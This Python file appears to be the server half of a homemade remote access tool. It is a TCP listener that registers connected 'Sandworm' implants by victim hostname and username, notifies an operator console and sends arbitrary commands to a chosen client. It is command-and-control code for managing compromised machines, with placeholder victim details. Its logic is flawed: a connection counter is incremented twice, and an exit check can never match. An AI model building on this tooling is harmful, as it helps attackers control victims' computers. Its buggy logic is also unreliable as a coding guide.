import threading
import socket
import logger

log = logger.Logger(verbosity="debug")


class TCPServer:

    def __init__(self, IP:str, PORT:int, on_new_sandworm, threads:int = 5):
        """
        Initializing the TCPServer class

        :param IP : Interface on which to listen
        :param PORT : port number on which to listen
        :param threads : number of concurrents clients accepted
        """

        self.IP = IP
        self.PORT = PORT
        self.threads = threads
        
        self.server = None # will be initialized in listen()
        self.running = False # Flag to control server shutdown
        
        self.counter = 0 # Keep track of clients
        self.clients = {} # Dictionary to store connceted Sandworms (clients)

        self.on_new_sandworm = on_new_sandworm # Callback function to signal new client

        log.debug(f"TCPServer initialized for {IP}:{PORT} with capacity {threads}")


    def listen(self):
        self.running = True
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allows reusing the same port quickly
        self.server.bind((self.IP, self.PORT))
        self.server.listen(self.threads)
        
        log.info(f"TCPServer started listening for {self.IP}:{self.PORT} with capacity {self.threads}")

        try:

            while self.running:
                client_socket, address = self.server.accept()
                self.counter+=1
                log.info(f"Accepted connection from {address[0]}:{address[1]}")

                # TODO
                # Extract the victime hostname and username
                hostname = "tonysDesktop"
                username = "tony"
                index = self.counter
                self.counter+=1

                # Store the client
                self.clients[index] = {
                    "socket": client_socket,
                    "hostname": hostname,
                    "username": username
                }

                # Notifying ArakisCLI about new connection
                self.on_new_sandworm(index, hostname, username, client_socket)

                log.info(f"Sandworm [{index}] registered -> Host: {hostname}, User: {username}")

                client_handler = threading.Thread(target=self.handle_client, args=(client_socket,index))
                client_handler.daemon = True # Ensures threads exit when main program ends
                client_handler.start()

        except KeyboardInterrupt:
            log.warning("Server shutting down due to keyboard interrupt.")
        finally:
            self.stop()


    def handle_client(self, client_socket, index):
        """
        Handles a single client connection.

        :param client_socket: The client's socket object
        :param address: The client's (IP, Port) tuple
        """       
        
        try:
            while True:
                data = client_socket.recv(1024)

                if not data:
                    break

                data = data.decode().strip()
                log.debug(f"Data from Sandworm [{index}] : {data}")

                
                if data == "exit\n":
                    log.warning(f"Received 'exit' command, closing connection")
                    break
                else:
                    client_socket.send(b'ACK')
        
        except Exception as e:
            log.error(f"Error handling client {index} : {e}")
        
        finally:
            self.counter-=1
            log.info(f"Closing connection with client {index}")
            client_socket.close()


    def send_to_client(self, index, command):
        """
        Send a command to a specific sandworm
        """
        if index in self.clients:
            self.clients[index]["socket"].send(command.encode() + b"\n")
        else:
            print(f"Sandworm [{index}] does not exist")

    
    def stop(self):
        """
        Stops the server gracefully.
        """
        log.warning("Stopping TCP server...")
        self.running = False
        if self.server:
            self.server.close()



